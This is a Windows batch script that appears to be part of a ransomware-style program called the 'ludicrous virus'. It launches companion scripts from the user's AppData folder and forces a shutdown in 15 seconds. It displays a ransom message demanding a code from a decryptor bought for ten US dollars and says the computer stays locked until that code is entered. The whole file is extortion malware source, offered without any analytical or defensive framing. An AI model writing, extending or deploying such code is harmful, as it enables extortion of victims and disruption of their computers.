@echo off
mode con cols=50 lines=13
SetLocal EnableDelayedExpansion
color 3b
start C:\Users\%username%\AppData\Local\Ludi\warn.vbs
set ludiread=
for /F "delims=" %%i in (C:\Users\%username%\AppData\Local\Ludi\ludidecrypt.lud) do set frcode=%ludiread% %%i >nul
shutdown /s /t 15
echo.
echo (15 Seconds Until Shutdown)
echo.
echo Uh Oh, you have been infected 
echo with the ludicrous virus. To 
echo remove this virus please insert 
echo the code you were given from the 
echo decryptor you paid 10 dollars US for. 
echo If you have lost or deleted the 
echo decryptor, you must pay again.
echo Your computer will be in a lock
echo down state until ludicrous is removed.
echo.
set /p code="Code:"
if %code% == %frcode% goto correct
if not %code% == %frcode% goto incorrect
:correct
start C:\Users\%username%\AppData\Local\Ludi\abort.bat
echo.
echo Correct Code!
echo This window will auto-close.
ping localhost 1.1.1.1 >nul
ping localhost 1.1.1.1 >nul
ping localhost 1.1.1.1 >nul
ping localhost 1.1.1.1 >nul
exit
:incorrect
start C:\Users\%username%\AppData\Local\Ludi\incorrect.bat
exit